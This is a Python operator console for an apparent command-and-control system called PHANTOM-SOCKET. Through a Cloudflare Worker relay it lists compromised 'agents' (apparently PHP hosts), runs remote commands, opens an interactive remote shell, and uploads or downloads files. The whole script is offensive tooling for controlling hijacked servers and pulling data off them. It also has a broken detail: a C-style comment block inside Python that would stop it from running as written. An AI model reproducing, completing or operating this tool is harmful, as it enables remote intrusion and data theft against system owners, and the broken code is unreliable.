#!/usr/bin/env python3
import json
import base64
import time
import sys
import os
import urllib.request
import urllib.parse
import argparse
import readline

/**
 * PHANTOM-SOCKET V3.1 — KALI WSL MONITORING CLI
 * GHOST PROTOCOL: CLOUDFLARE WORKER BRAIN
 * 
 * Version: v3.1-ghost-cf
 * Principal Systems Engineer: "Control is the illusion of the unprepared."
 */

# ANSI Colors
GREEN = "\033[32m"
RED = "\033[31m"
YELLOW = "\033[33m"
BLUE = "\033[34m"
CYAN = "\033[36m"
RESET = "\033[0m"

HISTORY_FILE = os.path.expanduser("~/.phantom_history")

class PhantomCLI:
    def __init__(self, relay_url, auth_key):
        self.relay_url = relay_url.rstrip('/')
        self.auth_key = auth_key
        self.current_agent = None

    def _request(self, endpoint, method="GET", data=None):
        url = self.relay_url + endpoint
        headers = {
            "X-Auth": self.auth_key,
            "Content-Type": "application/json",
            "User-Agent": "Phantom-CLI/3.1-ghost-cf"
        }
        
        body = json.dumps(data).encode('utf-8') if data else None
        req = urllib.request.Request(url, data=body, headers=headers, method=method)
        
        try:
            with urllib.request.urlopen(req) as response:
                return json.loads(response.read().decode('utf-8'))
        except Exception as e:
            print(f"{RED}[ERROR] {e}{RESET}")
            return None

    def list_agents(self):
        print(f"{BLUE}[*] Fetching agents from Cloudflare...{RESET}")
        res = self._request("/api/agents")
        if res:
            print(f"\n{CYAN}{'AGENT_ID':<34} | {'HOSTNAME':<20} | {'OS':<15} | {'PHP':<8} | {'LAST_SEEN'}{RESET}")
            print("-" * 95)
            for a in res:
                info = a['info']
                last_seen_ts = info['last_seen'] / 1000
                last_seen = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(last_seen_ts))
                color = GREEN if (time.time() - last_seen_ts) < 60 else RED
                print(f"{color}{a['id']:<34}{RESET} | {info['hostname']:<20} | {info['os']:<15} | {info['php_ver']:<8} | {last_seen}")
        else:
            print(f"{YELLOW}[!] No agents found.{RESET}")

    def send_cmd(self, agent_id, command, args={}):
        payload = {
            "agent_id": agent_id,
            "command": command,
            "args": args
        }
        res = self._request("/api/cmd", method="POST", data=payload)
        if res and "task_id" in res:
            return res["task_id"]
        return None

    def get_result(self, task_id):
        return self._request(f"/api/cmd/{task_id}")

    def wait_result(self, task_id, timeout=60):
        print(f"{BLUE}[*] Waiting for result (Task: {task_id})...{RESET}", end="", flush=True)
        start = time.time()
        while time.time() - start < timeout:
            res = self.get_result(task_id)
            if res and "output" in res:
                print(f"\n{GREEN}Output:{RESET}\n{res['output']}")
                return res['output']
            print(".", end="", flush=True)
            time.sleep(2)
        print(f"\n{YELLOW}[!] Timeout waiting for result.{RESET}")
        return None

    def interactive_shell(self, agent_id):
        self.current_agent = agent_id
        print(f"{GREEN}[+] Interactive shell started for {agent_id}. Type 'exit' to quit.{RESET}")
        
        if os.path.exists(HISTORY_FILE):
            readline.read_history_file(HISTORY_FILE)
            
        while True:
            try:
                cmd = input(f"{CYAN}phantom@{agent_id}{RESET}:~# ").strip()
                if not cmd: continue
                if cmd == "exit": break
                
                task_id = self.send_cmd(agent_id, "exec", {"cmd": cmd})
                if task_id:
                    self.wait_result(task_id)
                
                readline.write_history_file(HISTORY_FILE)
            except EOFError:
                break
            except KeyboardInterrupt:
                print("\n")
                continue

    def upload(self, agent_id, local_path, remote_path):
        if not os.path.exists(local_path):
            print(f"{RED}[ERROR] Local file not found: {local_path}{RESET}")
            return
        
        with open(local_path, "rb") as f:
            content = base64.b64encode(f.read()).decode('utf-8')
        
        print(f"{BLUE}[*] Uploading {local_path} to {remote_path}...{RESET}")
        task_id = self.send_cmd(agent_id, "write", {"path": remote_path, "data": content})
        if task_id:
            self.wait_result(task_id)

    def download(self, agent_id, remote_path, local_path):
        print(f"{BLUE}[*] Requesting file: {remote_path}...{RESET}")
        task_id = self.send_cmd(agent_id, "read", {"path": remote_path})
        if task_id:
            output = self.wait_result(task_id)
            if output:
                try:
                    with open(local_path, "wb") as f:
                        f.write(base64.b64decode(output))
                    print(f"{GREEN}[+] File saved to {local_path}{RESET}")
                except Exception as e:
                    print(f"{RED}[ERROR] Failed to save file: {e}{RESET}")

def main():
    parser = argparse.ArgumentParser(description="PHANTOM-SOCKET V3.1 - GHOST CLI")
    parser.add_argument("--relay", required=True, help="Cloudflare Worker URL")
    parser.add_argument("--auth", required=True, help="Authentication Key")
    
    subparsers = parser.add_subparsers(dest="command")
    
    # agents
    subparsers.add_parser("agents", help="List active agents")
    
    # cmd
    cmd_parser = subparsers.add_parser("cmd", help="Send single command")
    cmd_parser.add_argument("--agent", required=True)
    cmd_parser.add_argument("--command", required=True)
    
    # upload
    up_parser = subparsers.add_parser("upload", help="Upload file")
    up_parser.add_argument("--agent", required=True)
    up_parser.add_argument("--local", required=True)
    up_parser.add_argument("--remote", required=True)
    
    # download
    dl_parser = subparsers.add_parser("download", help="Download file")
    dl_parser.add_argument("--agent", required=True)
    dl_parser.add_argument("--remote", required=True)
    dl_parser.add_argument("--local", required=True)
    
    # shell
    sh_parser = subparsers.add_parser("shell", help="Interactive shell")
    sh_parser.add_argument("--agent", required=True)

    # dashboard
    subparsers.add_parser("dashboard", help="Open Dashboard URL")

    args = parser.parse_args()
    cli = PhantomCLI(args.relay, args.auth)

    if args.command == "agents":
        cli.list_agents()
    elif args.command == "cmd":
        tid = cli.send_cmd(args.agent, "exec", {"cmd": args.command})
        if tid: cli.wait_result(tid)
    elif args.command == "upload":
        cli.upload(args.agent, args.local, args.remote)
    elif args.command == "download":
        cli.download(args.agent, args.remote, args.local)
    elif args.command == "shell":
        cli.interactive_shell(args.agent)
    elif args.command == "dashboard":
        print(f"{GREEN}[+] Dashboard: {args.relay}/dashboard{RESET}")
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
